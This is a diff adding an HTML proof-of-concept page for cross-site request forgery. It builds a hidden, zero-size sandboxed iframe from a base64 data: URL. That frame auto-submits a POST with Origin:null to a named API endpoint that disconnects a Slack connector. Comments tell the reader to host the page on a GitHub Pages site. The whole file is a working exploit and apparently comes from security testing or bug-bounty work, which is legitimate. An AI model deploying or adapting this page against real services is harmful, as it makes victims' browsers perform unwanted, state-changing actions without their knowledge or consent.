@@ -1,0 +1,34 @@
+<!doctype html>
+<!-- CSRF PoC: Origin:null via sandboxed iframe with data: URL.
+     Notes:
+       - Must be hosted on https://<your-gh-username>.github.io/.
+       - The inner sandboxed document has no 'allow-same-origin', forcing Origin:null on the POST.
+       - Many servers should reject Origin:null; acceptance indicates a CSRF bypass. -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF PoC — Origin:null via sandboxed iframe</title>
+  </head>
+  <body>
+    <h1>CSRF PoC — Origin:null via sandboxed iframe</h1>
+    <p>This page creates a sandboxed iframe that auto-submits a POST from an opaque origin.</p>
+
+    <iframe id="x" sandbox="allow-forms allow-scripts" style="width:0;height:0;border:0;"></iframe>
+
+    <script>
+      // Build the inner HTML that will live inside the sandboxed iframe.
+      var payload = [
+        '<!doctype html><html><head><meta charset=\"utf-8\"></head><body>',
+        '<form id=\"f\" method=\"POST\" action=\"https://apigateway-security-test.euw1.n8s.appsflyer.engineering/agents-market-place/v1/connectors/slack/disconnect\">',
+        '<input type=\"submit\" value=\"Go\">',
+        '</form>',
+        '<script>setTimeout(function(){ document.getElementById(\'f\').submit(); }, 50);<\/script>',
+        '</body></html>'
+      ].join('');
+
+      // Use a data: URL; no allow-same-origin => Origin:null on the POST.
+      var dataUrl = 'data:text/html;base64,' + btoa(payload);
+      document.getElementById('x').src = dataUrl;
+    </script>
+  </body>
+</html>
